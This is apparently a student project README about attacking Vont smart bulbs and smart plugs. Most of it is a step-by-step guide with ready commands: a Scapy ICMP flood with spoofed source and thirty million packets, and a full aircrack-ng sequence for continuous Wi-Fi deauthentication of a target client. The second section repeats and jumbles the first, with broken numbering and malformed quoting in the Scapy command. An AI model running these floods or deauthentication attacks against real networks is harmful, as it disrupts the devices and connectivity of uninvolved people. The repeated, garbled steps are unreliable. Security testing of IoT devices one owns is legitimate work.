# Exploiting-IoT-Devices
The objective of this project is to find the vulnerabilities in the smart devices. To achieve this task we worked on the IOT devices i.e Smart Plug, Smart Bulb, Smart Camera. We looked into retrieving the data packets that used to trigger ON and OFF conditions and also evaluate the protocols used for communication. 

## **1. Vont Smart Bulb**

To check the vulnerability of the device, we performed several attacks on the device. For executing these attacks on smart devices we used Scapy tool for DoS attack and also we implemented the Deauthentication attack. But, because the bulb is using bluetooth for authentication. As a result the De-authentication didn’t work successfully. Only the DoS attack using Scapy tool successfully worked. 

To perform the DoS attack we used Scapy tool, to implement the attack we required the IP address of the targeted device and to discover the IP address we can use NMAP  and arp command in linux or we can download the Advanced IP scanner tool which is free and easily available.

Here we used the below command and sent multiple packets to interrupt the communication between the mobile app and smart devices.

Step 1: Install the scapy tool in your kali-linux machine.

``` $ sudo sudo apt install python3-scapy ```
or


``` $ sudo sudo apt install scapy ```

After that run the scapy tool 

``` $scapy ```

Step 2 : Open the wireshark and start monitoring the network activity. 


Step 3 : Implementing the DOS attack 

``` >> send(IP(src=“(device IP address of smart bulb)",dst=" (“device IP address of smart bulb ")/ICMP(), count=30000000) ```


## **2. Vont Smart Plug**
 
While looking for the vulnerability of the smart plug, we performed several attacks on the device. For executing these attacks on smart devices we used Scapy tool for DoS attack and also we implemented the Deauthentication attack. Because the plug is using WiFi for authentication and communication. As a result the De-authentication worked successfully.

### **Deauthenticatetion Atttack**

Step 1  : To perform the deauth attack  we need to install the aircrack-ng suite.

Step 1: Install aircrack-ng

Note : If you are using Kali or Parrot then aircrack-ng is already pre-installed in your system so you may skip this step.

```$sudo apt-get update```

```$sudo apt-get install aircrack-ng```

Step 2: Find the network adapter you are going to use

```$iwconfig```     #lists all available wireless cards

Step 3: Putting your adapter in monitor mode

```$sudo airmon-ng check kill ```   #kills all active processes running on the adapter


```$sudo airmon-ng start (available wireless cards)```     #set our adapter in monitor mode


```$sudo airmon-ng start wlan0 ```     #for example my wireless card is wlan0 


Step 4: Scout for APs

``` $sudo airodump-ng wlan0mon ``` #scans and lists all clients and APs in range

we press Ctrl+C to stop the scan whenever we want.

Step 5: Scan for targets

``` $sudo airodump-ng -d target_BSSID -c channel_num adapters_mon_name ``` 
#-d selecting BSSID
#-c channel

Step 6: De-authenticating the target

``` $aireplay-ng -0 0 -a target_BSSID -c clients_address adapters_mon_name ```

#-0 stands for de-authentication (the following 0 means that there is no waiting time between each #"package delivery" they are sent continuously)
#-a address of AP
#-c client
For example : 

``` >> sudo aireplay-ng -0 0 -a 2A:22:E9:6E:XX:XX -c  38:E6:0A:25:XX:XX  wlo1mon```

You’ve done it! You are now performing a deauth attack. If you wish to stop you just press Ctrl+C.

Extra Step:

If you were using the same adapter you use for internet connection then you lost internet connection once you set it to monitor mode. After you are done with your deauth attack you simply type the following commands:

``` $sudo airmon-ng stop wlan0mon ```  #this will stop the monitor mode

``` $sudo systemctl start NetworkManager ```  #restart the wireless interface


Final Note: Do not mess around with public APs or APs that are not your own, it may seem cool…but it’s NOT.

### **To perform the DOS attack using Scapy**


Step 1: Install the scapy tool in your kali-linux machine.

``` $ sudo sudo apt install python3-scapy ```
or

``` $ sudo sudo apt install scapy ```

After that run the scapy tool 

``` $scapy ```

Step 2 : Open the wireshark and start monitoring the network activity. 


Step 3 : Implementing the DOS attack 

``` >> send(IP(src=“(device IP address of smart bulb)",dst=" (“device IP address of smart bulb ")/ICMP(), count=30000000) ```

```$sudo airmon-ng start (available wireless cards)```     #set our adapter in monitor mode

```$sudo airmon-ng start wlan0 ```     #for example my wireless card is wlan0

``` $sudo airodump-ng wlan0mon ``` #scans and lists all clients and APs in range

we press Ctrl+C to stop the scan whenever we want.

Step 5: Scan for targets

``` $sudo airodump-ng -d target_BSSID -c channel_num adapters_mon_name ```

#-d selecting BSSID
#-c channel

``` $aireplay-ng -0 0 -a target_BSSID -c clients_address adapters_mon_name ```

#-0 stands for de-authentication (the following 0 means that there is no waiting time between each #"package delivery" they are sent continuously)
#-a address of AP
#-c client
For example : 

``` >> sudo aireplay-ng -0 0 -a 2A:22:E9:6E:XX:XX -c  38:E6:0A:25:XX:XX  wlo1mon```
